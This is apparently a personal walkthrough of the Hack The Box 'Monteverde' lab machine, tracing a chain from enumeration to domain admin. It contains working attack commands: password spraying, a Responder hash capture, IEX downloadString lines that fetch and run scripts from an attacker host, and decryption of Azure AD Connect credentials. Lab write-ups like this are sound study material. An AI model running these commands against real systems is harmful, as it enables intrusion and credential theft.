#Enumeration #nmap 

`sudo nmap -sC -sV -oA nmap/monteverde 10.10.10.172`
`-sC for default scripts`
`-sV for enumerate all versions`
`-oA output all formats`

![[Pasted image 20241218215532.png]]
Domain is MEGABANK.LOCAL
Clock skew -48mins

Clocks need to be synced if we end up needing to forge tickets (tgt or tgs)

DNS Enumeration with #nslookup but kind of weird results and no info. 

![[Pasted image 20241218215923.png]]
Enumerating #rpcclient 

`rpcclient -U '' 10.10.10.172` and authenticated anonymously

![[Pasted image 20241218220103.png]]
Enumerate users with `enumdomusers`

![[Pasted image 20241218220148.png]]
Some rpc commands available on ippsec.rocks as well

![[Pasted image 20241218220331.png]]

https://ippsec.rocks/?#

Run `querydispinfo` to dump active directory info

![[Pasted image 20241218220610.png]]
Building a wordlist of found users like in [[Forest]]

`vim users.lst`

`6x` to delete first six characters 

![[Pasted image 20241218220950.png]]
Interesting user AAD_987d7 this is an active directory ADSync thing to sync passwords between Azure and OnPrem

Running #crackmapexec 

`crackmapexec -u users.lst -p users.txt`

Create quick password list using #hashcat

`hashcat --force --stdout -r /usr/share/hashcat/rules/best64.rule > password.lst`

Check the password policy 
`crackmapexec smb 10.10.10.172 --pass-pol`

![[Pasted image 20241219203015.png]]
Account lockout threshold: none 

Running #crackmapexec with user.lst and password.lst

`crackmapexec smb 10.10.10.172 -u users.lst -p password.lst`

![[Pasted image 20241219203142.png]]
Got one user:password match for SABatchJobs: SABatchJobs. No (pwned) so no admin privs. 

Try connecting with #crackmapexec and #winrm 

`crackmapexec winrm 10.10.10.172 -u SABatchJobs -p SABatchJobs`

This failz 

![[Pasted image 20241219203509.png]]

Trying smb share enumeration with #smbmap 

`smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172`

![[Pasted image 20241219203726.png]]
Let's enumerate the users share using #smbmap 

`smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 -r --exclude SYSVOL,IPC$`

See usernames but don't have privileges to go into the user directory 

![[Pasted image 20241219204155.png]]

We want to re-run with `-R` to recursively list all contents within each directory

![[Pasted image 20241219204404.png]]
`smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 -R

We have permissions to go in the mhope directory who has an azure.xml file 

![[Pasted image 20241219204705.png]]
Can obtain this file using #smbclient 

`smbclient -U SABatchJobs //10.10.10.172/users$`

Enter SABatchJobs as password. 

cd into mhope directory and `get azure.xml`

![[Pasted image 20241219204952.png]]
Can also use #smbmap again with `--download` flag

`smbmap -U SABatchJobs -p SABatchJobs -H 10.10.10.172 --download users$/mhope/azure.xml`

Contents of this file. Got another password. 
'4n0therD4y@n0th3r$'

![[Pasted image 20241219205227.png]]
Find out the user with the users.lst and #crackmapexec 

`crackmapexec smb 10.10.10.172 -u users.lst -p '4n0therD4y@n0th3r$'`

This is mhope's password. 

![[Pasted image 20241219205631.png]]
Cannot use psexec because there's no pwned. 

We can use #crackmapexec with #winrm though

`crackmapexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'`

![[Pasted image 20241219205845.png]]
Now can get a reverse shell. 

Let's do #evilwinrm 

`evil-winrm -u mhope -p '4n0therD4y@n0th3r$' -i 10.10.10.172`

![[Pasted image 20241219210050.png]]
Good screenshot to run `hostname; whoami; ipconfig`

![[Pasted image 20241219210150.png]]
Looking for privilege escalation vector with #seatbelt
Check [[Resolute]] for install
upload Seatbelt.exe to remote shell. 

![[Pasted image 20241219210346.png]]
It failed to run because of an encoding issue within evil-winrm. 

![[Pasted image 20241219210451.png]]

Need to transfer file using #pythonhttpserver 

`python3 -m http.server`

Retrieve using #curl

`curl 10.10.14.2:8000/Seatbelt.exe -o Seatbelt.exe`

Then run `.\Seatbelt.exe` on remote box. 

`.\Seatbelt.exe -group=all` 

Running #winpeas also because Seatbelt.exe didn't find much. 

`curl 10.10.14.2:8000/winPEAS.exe -o winPEAS.exe`

Execute winPEAS with `.\winPEAS.exe`

Manual enumeration time also  

`whoami /all`

We are a member of Azure Admins 

![[Pasted image 20241219222719.png]]
Playing with #SQLCMD to view the MSSQL Database

`sqlcmd -?` to get usage info

`sqlcmd -Q "select * from sys.databases"`

Can view column names:

![[Pasted image 20241219223145.png]]

Let's automate this enumeration with #PowerUpSQL 

https://github.com/NetSPI/PowerUpSQL/tree/master

Put `PowerUpSQL.ps1` in directory being served up by python simple http server. 

Use IEX to retrieve the file because it's best for PowerShell?

`IEX(New-Object Net.WebClient).downloadString("http://10.10.14.2:8000/PowerUpSQL.ps1")`

Search for PowerUp SQL cheat sheet 

https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet

Discover local SQL server instances 

`Get-SQLInstanceLocal -Verbose`

![[Pasted image 20241219224559.png]]
We don't have permission to `Get-WmiObject`

Looking at SQL Server Priv Esc Cheats...

Audit for issues 

`Invoke-SQLAudit -Verbose`

Potential privilege escalation vector with #xp_dirtree

![[Pasted image 20241219225326.png]]
On `evil-winrm` shell run `sqlcmd -Q "xp_dirtree '\\10.10.14.2\test'`

On parrot with #responder run 

`sudo responder -I tun0`

Got NTLMv2 #passwordhash

![[Pasted image 20241219225735.png]]

This hash is not crackable because its a machine account (the username ends in $)


```
Googling Azure AD Privilege Escalation xpn 

https://blog.xpnsec.com/azuread-connect-for-redteam/

Azure AD Connect is a tool to synchronize password hashes between Azure Office 365 and On-Prem. 

PHS - Password Hash Synchronization 

Inside the Azure AD Sync database there is an mms_management_agent table with a private_configuration_xml. This xml has details on the MSQL user. 

```

With #SQLCMD grab the private config xml 

`sqlcmd -Q "Use ADSync; select private_configuration_xml FROM mms_management_agent"`

Get some details like forest login, forest domain, etc. 
![[Pasted image 20241222205322.png]]

Grab the encrypted info as well to display the encrypted password!

`sqlcmd -Q "Use ADSync; select private_configuration_xml, encrypted_configuration FROM mms_management_agent"`

![[Pasted image 20241222205657.png]]
Going back to that blogpost to figure out how to decrypt the password..author has a POC to decrypt it. 

![[Pasted image 20241222210040.png]]
Copy and paste this POC script to a file on Parrot box called `decrypt.ps1` or `decrypt.sh` for syntax highlighting in vim.

Need to query `keyset_id, instance_id, and entropy`
using sqlcmd again to fill values from decryption script. 

```
sqlcmd -Q "Use ADSync; select keyset_id, instance_id, entropy FROM mms_server_configuration"
```
![[Pasted image 20241222210459.png]]

Dropping this script onto reverse shell using #IEX

First serve up the script with #pythonhttpserver 

`python3 -m http.server`

Grab it 

`IEX(New-Object Net.WebClient).downloadString(http://10.10.14.2:8000/decrypt.ps1')`

This crashes winrm for some reason

![[Pasted image 20241222211106.png]]
Going to figure out which part of the script is failing by copying and pasting each line of the script into remote shell one by one. 

![[Pasted image 20241222211240.png]]
Literally line 2 `$client.Open()` caused an error, but that was the only problem. 

![[Pasted image 20241222211351.png]]
Looks like PoC script is for a remote connection, but we are doing a local connection. 

Googling other methods to connect to SQL server..

`$sqlConn = New-Object System.Data.SqlClient.SqlConnection`

`$sqlConn.ConnectionString = "Server=localhost\sql12; Integrated Security=true; Initial Catalog=master"`

`$sqlConn. Open()`

![[Local SQL Server Connection Command.png]]
Modifying our command to:

`$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server Integrated Security=true;Initial Catalog=ADSync"`

![[Monteverde Local SQL Server Connection Command.png]]

So now the second line of the script $client.Open() ran with no errors. 

Updating `decrypt.ps1` script and re-running it worked. 

Got admin password:
![[monteverde-admin-creds.png]]

Going to #crackmapexec 

`crackmapexec smb 10.10.10.172 -u administrator -p d0m@in4dminyeah!`

this werked. 

![[monteverde cme pwned.png]]

Can connect with #psexec 

`psexec.py administrator@10.10.10.172`

![[monteverde admin psexec.png]]



